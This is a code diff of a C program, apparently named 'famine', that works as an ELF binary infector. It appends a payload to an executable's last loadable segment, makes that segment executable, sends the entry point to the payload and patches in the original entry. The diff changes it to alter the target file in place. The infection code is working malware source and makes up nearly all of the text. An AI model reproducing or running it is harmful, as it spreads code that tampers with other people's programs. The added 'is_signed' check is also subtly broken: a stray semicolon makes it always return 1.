@@ -1,22 +1,17 @@
 #include "famine.h"
-#include <stdlib.h>
-#include <elf.h>
-#include <stdio.h>
-#include <string.h>
-#include <fcntl.h>
-#include <sys/stat.h>
-#include <sys/mman.h>
-#include <unistd.h>
+
 
 Elf64_Phdr *last_phdr(char *data)
 {
-    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)(data);
-    Elf64_Phdr *phdrs = (Elf64_Phdr *)(data + ehdr->e_phoff);
+    int         i;
+    Elf64_Ehdr  *ehdr;
+    Elf64_Phdr  *phdrs;
+    Elf64_Phdr  *target;
 
-    
-    Elf64_Phdr *target = NULL;
-    
-    int i = 0;
+    ehdr = (Elf64_Ehdr *)(data);
+    phdrs = (Elf64_Phdr *)(data + ehdr->e_phoff);
+    target = NULL;
+    i = 0;
     while(i < ehdr->e_phnum)
     {
         if (phdrs[i].p_type == PT_LOAD)
@@ -29,59 +24,75 @@ Elf64_Phdr *last_phdr(char *data)
 
 uint64_t payload(char *data, size_t data_size, char *code, size_t code_size)
 {
-    Elf64_Phdr *target = last_phdr(data);
-    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)data;
+    Elf64_Phdr  *target;
+    Elf64_Ehdr  *ehdr;
+    uint64_t    orig_filesz;
+    uint64_t    gap;
+    uint64_t    old_entry;
+    uint64_t    new_entry;
     
-    uint64_t orig_filesz = target->p_filesz;
-    uint64_t gap = data_size - (target->p_offset + orig_filesz);
-    
-    Elf64_Addr new_entry = target->p_vaddr + orig_filesz + gap;
-    
+
+    target = last_phdr(data);
+    ehdr = (Elf64_Ehdr *)data;
+    orig_filesz = target->p_filesz;
+    gap = data_size - (target->p_offset + orig_filesz);
+    new_entry = target->p_vaddr + orig_filesz + gap;
     target->p_filesz += gap + code_size;
     target->p_memsz  += gap + code_size;
     target->p_flags  |= PF_X;
-    
-    uint64_t old_entry = ehdr->e_entry;
+    old_entry = ehdr->e_entry;
     ehdr->e_entry = new_entry;
-    
     memmove(data + data_size, code, code_size);
-    
     return old_entry;
 }
 
+int is_signed(char *addr, size_t size)
+{
+    if (memmem(addr, size, SIGNATURE, SIGNATURE_SIZE));
+        return 1;
+    return 0;
+}
 
+t_file file_load(char *path, size_t append_size)
+{
+    t_file file;
 
+    file.fd = open(path, O_RDWR);
+    file.size = lseek(file.fd, 0, SEEK_END);
+    lseek(file.fd, 0, SEEK_SET);
+    if (append_size > 0)
+    {
+    
+        if (ftruncate(file.fd, file.size + append_size) < 0)
+            perror("error\n");
+    }
+    file.head = mmap(NULL, file.size + append_size, PROT_READ | PROT_WRITE, MAP_SHARED, file.fd, 0);
+    file.size += append_size;
+    close(file.fd);
+    return file;
+}
+
+int file_unload(t_file file)
+{
+    if (munmap(file.head, file.size))
+        return 1;
+    return 0;
+}
 
 int main(void)
 {
-    int fd = open("example", O_RDONLY);
-    int fd2 = open("payload.bin", O_RDONLY);
+    uint64_t    entry;
+    uint64_t    *patch;
+    t_file      target;
+    t_file      payload_;
 
-    struct stat st;
-    struct stat st2;
+    payload_ = file_load("payload.bin", 0);
+    target = file_load("example", payload_.size);
 
-    fstat(fd, &st);
-    if (fstat(fd2, &st2) < 0)
-        perror("error\n");
-
-
-    char *data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-    char *code = mmap(NULL, st2.st_size, PROT_READ, MAP_PRIVATE, fd2, 0);
-    close(fd);
-    close(fd2);
-
-    char *new = malloc(st.st_size + st2.st_size + 1);
-    
-    memcpy(new, data, st.st_size);
-
-    uint64_t entry = payload(new, st.st_size, code, st2.st_size);
-    uint64_t *patch = memmem(new, st.st_size + st2.st_size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
-    if (patch)
-        *patch = entry;
-
-    int out = open("test2", O_WRONLY | O_CREAT | O_TRUNC, 0755);
-write(out, new, st.st_size + st2.st_size);
-close(out);
-    
+    entry =  payload(target.head, target.size - payload_.size, payload_.head, payload_.size);
+    patch = memmem(target.head, target.size, "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
+    *patch = entry;
+    file_unload(target);
+    file_unload(payload_);
     return 0;
 }
